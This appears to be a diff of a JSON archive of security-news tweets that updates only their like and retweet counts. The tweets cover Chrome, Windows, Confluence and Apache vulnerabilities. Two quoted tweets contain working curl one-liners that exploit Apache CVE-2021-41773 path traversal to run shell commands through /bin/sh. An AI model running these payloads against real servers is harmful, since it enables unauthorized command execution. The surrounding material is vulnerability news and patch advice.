@@ -154,10 +154,10 @@
     "expanded_url": [
         "https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/"
     ],
-    "tweetfavorites": 179,
+    "tweetfavorites": 172,
     "tweetquotes": 5,
     "tweetreplies": 2,
-    "tweetretweets": 69,
+    "tweetretweets": 67,
     "tweettext": "#PuzzleMaker\nWe found a complete exploit chain which involves #Chrome #RCE vuln #CVE-2021-21224 and Windows EoP vuln #CVE-2021-31956 in the wild. This exploit chain allows attackers to escape Chrome sandbox and execute code with Windows system privileges.\n\nhttps://t.co/W3sPCNtR2G https://t.co/2J5zU7ho3Y",
     "tweettime": "2021-10-27, 09:25:35",
     "tweeturl": "https://twitter.com/RedDrip7/status/1453291780078714880",
@@ -309,10 +309,10 @@
         "https://securelist.com/mysterysnail-attacks-with-windows-zero-day/104509/",
         "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40449"
     ],
-    "tweetfavorites": 212,
+    "tweetfavorites": 207,
     "tweetquotes": 4,
     "tweetreplies": 2,
-    "tweetretweets": 72,
+    "tweetretweets": 70,
     "tweettext": "We found an approach to exploit Windows zero-day vuln #CVE-2021-40449 which has been used in #MysterySnail #APT activity. It is a use-after-free EoP vulnerability in Win32k and was patched on October 12, 2021.\n\nhttps://t.co/tXE7xMdvFv\nhttps://t.co/RYuEcDKLBO https://t.co/O9qwpEx5H4",
     "tweettime": "2021-10-20, 08:39:15",
     "tweeturl": "https://twitter.com/RedDrip7/status/1450743401641431048",
@@ -361,10 +361,10 @@
     "expanded_url": [
         "https://www.synacktiv.com/sites/default/files/2021-10/AppJailLauncher.pdf"
     ],
-    "tweetfavorites": 115,
+    "tweetfavorites": 110,
     "tweetquotes": 4,
     "tweetreplies": 0,
-    "tweetretweets": 51,
+    "tweetretweets": 49,
     "tweettext": "Logical sandbox escape in AppJailLauncher (fix in AppJailLauncher plus Microsoft CVE-2021-41346), thanks @thalium_team for the blog post that led to the discovery of the bugs !\nhttps://t.co/ukRwPogStZ https://t.co/1PJGGBfXcA",
     "tweettime": "2021-10-18, 13:40:02",
     "tweeturl": "https://twitter.com/masthoon/status/1450094320028106767",
@@ -732,10 +732,10 @@
     "username": "TheHackersNews"
 }
 {
-    "tweetfavorites": 313,
+    "tweetfavorites": 309,
     "tweetquotes": 3,
     "tweetreplies": 4,
-    "tweetretweets": 89,
+    "tweetretweets": 85,
     "tweettext": "CVE-2021-42013 &amp; CVE-2021-41773\nApache HTTPd  Path Traversal and Remote Code Execution https://t.co/kKhaIBSzpp",
     "tweettime": "2021-10-08, 03:50:32",
     "tweeturl": "https://twitter.com/chybeta/status/1446322092828344321",
@@ -895,30 +895,30 @@
     "username": "GreyNoiseIO"
 }
 {
-    "tweetfavorites": 1215,
-    "tweetquotes": 50,
+    "tweetfavorites": 1115,
+    "tweetquotes": 45,
     "tweetreplies": 15,
-    "tweetretweets": 548,
+    "tweetretweets": 503,
     "tweettext": "Here's how to run full commands with arguments via CVE-2021-41773 via a path traversal vulnerability in the event mod-cgi is enabled on Apache 2.4.49\n\ncurl --data \"A=|id&gt;&gt;/tmp/x;uname\\$IFS-a&gt;&gt;/tmp/x\" 'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -vv\n\nPatch urgently. https://t.co/jaL6jpR42w",
     "tweettime": "2021-10-05, 23:30:19",
     "tweeturl": "https://twitter.com/hackerfantastic/status/1445531829985968137",
     "username": "hackerfantastic"
 }
 {
-    "tweetfavorites": 410,
-    "tweetquotes": 14,
-    "tweetreplies": 8,
-    "tweetretweets": 149,
+    "tweetfavorites": 397,
+    "tweetquotes": 12,
+    "tweetreplies": 9,
+    "tweetretweets": 144,
     "tweettext": "Exploiting CVE-2021-41773 to execute commands is incredibly easy once mod-cgi has been enabled... \n\ncurl --data \"A=|id&gt;/tmp/x\" 'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -vv\n\nand \"id\" runs ;-) https://t.co/g8JRK35sXb",
     "tweettime": "2021-10-05, 23:22:20",
     "tweeturl": "https://twitter.com/hackerfantastic/status/1445529822071967745",
     "username": "hackerfantastic"
 }
 {
-    "tweetfavorites": 561,
-    "tweetquotes": 23,
-    "tweetreplies": 17,
-    "tweetretweets": 220,
+    "tweetfavorites": 490,
+    "tweetquotes": 22,
+    "tweetreplies": 14,
+    "tweetretweets": 200,
     "tweettext": "Oh good, CVE-2021-41773 is in fact also RCE providing mod-cgi is enabled. An attacker can call any binary on the system and supply environment variables (that's how CGI works!) - if they can upload a file and set +x permissions, they can trivially run commands as Apache user. https://t.co/c3D2h5Cy4A",
     "tweettime": "2021-10-05, 22:57:19",
     "tweeturl": "https://twitter.com/hackerfantastic/status/1445523524555186189",
@@ -928,10 +928,10 @@
     "expanded_url": [
         "https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773"
     ],
-    "tweetfavorites": 253,
+    "tweetfavorites": 234,
     "tweetquotes": 3,
     "tweetreplies": 2,
-    "tweetretweets": 93,
+    "tweetretweets": 87,
     "tweettext": "Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49\n\nAll-in-One reproduction for CVE-2021-41773\nhttps://t.co/xeC7X4xeX1\n\n#Vulhub #infosec #security #bugbountytip https://t.co/DhD8BFin4o",
     "tweettime": "2021-10-05, 17:06:14",
     "tweeturl": "https://twitter.com/phithon_xg/status/1445435172787146754",
@@ -941,10 +941,10 @@
     "expanded_url": [
         "https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse"
     ],
-    "tweetfavorites": 621,
-    "tweetquotes": 9,
-    "tweetreplies": 4,
-    "tweetretweets": 201,
+    "tweetfavorites": 594,
+    "tweetquotes": 7,
+    "tweetreplies": 3,
+    "tweetretweets": 195,
     "tweettext": "I wrote a quick NMAP script for CVE-2021-41773 (Path Traversal on Apache HTTP Server 2.4.49).\nhttps://t.co/5ygupDfR47\n#infosec https://t.co/ENxCeYCM85",
     "tweettime": "2021-10-05, 16:51:26",
     "tweeturl": "https://twitter.com/RandomDhiraj/status/1445431445586120715",
@@ -972,7 +972,7 @@
     "tweetfavorites": 275,
     "tweetquotes": 2,
     "tweetreplies": 3,
-    "tweetretweets": 97,
+    "tweetretweets": 96,
     "tweettext": "Finally my disclosure request has been approved and here's a write-up of CVE-2021-26084, Confluence RCE. Though not much to add than what's already known of the CVE and it's exploits, i'm simply outlining my approach that led to this CVE .\n\nhttps://t.co/as1qLqNqMD",
     "tweettime": "2021-10-05, 16:07:58",
     "tweeturl": "https://twitter.com/bennyyjacob/status/1445420510590824451",
@@ -1042,10 +1042,10 @@
     "username": "campuscodi"
 }
 {
-    "tweetfavorites": 443,
+    "tweetfavorites": 434,
     "tweetquotes": 6,
     "tweetreplies": 6,
-    "tweetretweets": 131,
+    "tweetretweets": 128,
     "tweettext": "Just got worked exploit PoC for path traversal in Apache HTTP Server 2.4.49 (CVE-2021-41773) with my collab again @yabeow #bugbountytips 👀 https://t.co/oGHtbWwKHT",
     "tweettime": "2021-10-05, 13:53:03",
     "tweeturl": "https://twitter.com/ducnt_/status/1445386557574324234",
@@ -1055,10 +1055,10 @@
     "expanded_url": [
         "https://httpd.apache.org/security/vulnerabilities_24.html"
     ],
-    "tweetfavorites": 775,
-    "tweetquotes": 47,
-    "tweetreplies": 16,
-    "tweetretweets": 399,
+    "tweetfavorites": 726,
+    "tweetquotes": 44,
+    "tweetreplies": 15,
+    "tweetretweets": 366,
     "tweettext": "🔥 We have reproduced the fresh CVE-2021-41773 Path Traversal vulnerability in Apache 2.4.49.\n\nIf files outside of the document root are not protected by \"require all denied\" these requests can succeed.\n\nPatch ASAP! \n\nhttps://t.co/6JrbayDbqG https://t.co/AnsaJszPTE",
     "tweettime": "2021-10-05, 13:11:25",
     "tweeturl": "https://twitter.com/ptswarm/status/1445376079548624899",
